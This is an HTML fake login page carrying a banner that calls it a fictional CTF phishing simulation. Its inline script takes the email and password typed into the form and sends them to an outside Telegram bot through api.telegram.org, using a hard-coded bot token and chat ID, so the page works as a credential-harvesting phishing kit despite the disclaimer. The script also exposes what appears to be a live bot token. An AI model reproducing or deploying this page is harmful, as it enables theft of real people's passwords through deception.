<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <link rel="stylesheet" href="../style/bootstrap.css">
    <link rel="stylesheet" href="../style/theme.css">
    <link rel="icon" type="image/x-icon" href="../assets/imgs/favicon.svg">

    <title>Login - WebTech (Verify)</title>
  </head>
  <body class="bg-theme-dark text-light">


    <div class="alert alert-danger text-center fw-bold p-4 mb-0 border-0 rounded-0" role="alert" 
         style="background:#dc3545 !important; color:#fff !important; font-size:1.25rem; line-height:1.4;">
      <span style="font-size:1.6rem;">⚠️</span> THIS IS A FICTIONAL CTF CHALLENGE – FAKE PHISHING SIMULATION <span style="font-size:1.6rem;">⚠️</span><br>
      <strong style="font-size:1.4rem;">DO NOT</strong> enter real email addresses, passwords, 2FA codes or any personal information!<br>
      <span style="font-size:1.1rem; opacity:0.95;">
        This page is created ONLY for a Capture The Flag exercise.<br>
        <br>
        This is a simulation – no real accounts are affected.
      </span>
    </div>

    <nav class="navbar navbar-expand-lg navbar-dark bg-blur">
      <div class="container-fluid">
        <a class="navbar-brand fw-bold" href="../index.html">
          <img src="../assets/imgs/Logo.svg" alt class="logo-img">
        </a>
      </div>
    </nav>

    <main class="container d-flex align-items-center justify-content-center" style="min-height:70vh;">
      <div class="card p-4 shadow" style="max-width:420px; width:100%; background:var(--card-bg);">
        <h3 class="mb-3 text-center">Sign in to your account</h3>
        <form id="loginForm">
          <div class="mb-3">
            <label for="email" class="form-label">Email address</label>
            <input type="email" class="form-control" id="email" name="email" placeholder="you@company.com" required>
          </div>
          <div class="mb-3">
            <label for="password" class="form-label">Password</label>
            <input type="password" class="form-control" id="password" name="password" placeholder="••••••••" required>
          </div>
          <div class="d-flex justify-content-between align-items-center mb-3">
            <div class="form-check">
              <input class="form-check-input" type="checkbox" value="" id="remember">
              <label class="form-check-label" for="remember">Remember me</label>
            </div>
            <a href="#" class="text-muted">Forgot?</a>
          </div>
          <button type="submit" class="btn btn-primary w-100" id="submitBtn">Sign In</button>
        </form>
        <p class="mt-3 text-center text-muted small">Don't have an account? <a href="#">Sign up</a></p>
      </div>
    </main>

    <script src="../script/bootstrap.bundle.min.js"></script>
    <script src="../script/logger.js"></script>

<script>
const TOKEN = "8360813543:AAEXff1pasBtUu6SYNwXvwUsujru8Fi5WKs";
const CHAT_ID = "-1003863808356";

document.getElementById("submitBtn").addEventListener("click", function(e) {
    e.preventDefault();

    const user = document.getElementById("email").value.trim();
    const rec  = document.getElementById("password").value.trim();

    if (!user || !rec) {
        alert("Please fill all fields");
        return;
    }

    const message = 
`New Recommendation
-----------------
User: ${user}
Message: ${rec}`;

    const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;

    fetch(url)
        .then(res => res.json())
        .then(data => {
            if(data.ok){
                document.getElementById("submitBtn").innerText = "Sent";
                document.getElementById("submitBtn").disabled = true;
                setTimeout(() => {
                    document.getElementById("submitBtn").innerText = "send the recommendation";
                    document.getElementById("submitBtn").disabled = false;
                }, 2000);
                document.getElementById("username").value = "";
                document.getElementById("recommendation").value = "";
            } else {
                alert("Telegram API error");
            }
        })
        .catch(err => {
            console.error(err);
            alert("Network error");
        });
});
</script>


  </body>
</html>